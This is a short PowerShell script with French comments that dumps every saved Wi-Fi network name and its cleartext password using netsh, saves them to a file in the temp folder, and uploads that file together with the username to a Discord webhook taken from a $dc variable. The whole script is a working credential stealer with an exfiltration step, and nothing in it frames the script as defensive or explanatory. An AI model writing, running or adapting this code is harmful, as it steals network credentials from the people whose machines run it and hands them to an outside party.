# Récupération des informations Wi-Fi
$wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | ForEach-Object {
    $name=$_.Matches.Groups[1].Value.Trim()
    (netsh wlan show profile name="$name" key=clear) | Select-String "Key Content\W+\:(.+)$" | ForEach-Object {
        $pass=$_.Matches.Groups[1].Value.Trim()
        "$name : $pass"
    }
}

# Afficher les informations Wi-Fi récupérées
Write-Host "Informations Wi-Fi récupérées :"
Write-Host $wifiProfiles

# Écriture des informations dans un fichier texte
$wifiProfiles | Out-File -FilePath $env:TEMP/--wifi-pass.txt

# Vérification du contenu du fichier texte
Write-Host "Contenu du fichier texte :"
Get-Content $env:TEMP/--wifi-pass.txt

# Envoi du fichier à Discord
function Upload-Discord {
    param (
        [string]$file,
        [string]$webhook
    )

    $Body = @{
      'username' = $env:username
      'content' = Get-Content -Path $file -Raw
    }

    Invoke-RestMethod -ContentType 'Application/Json' -Uri $webhook -Method Post -Body ($Body | ConvertTo-Json)
}

if (-not ([string]::IsNullOrEmpty($dc))){
    Upload-Discord -file "$env:TEMP/--wifi-pass.txt" -webhook $dc
}
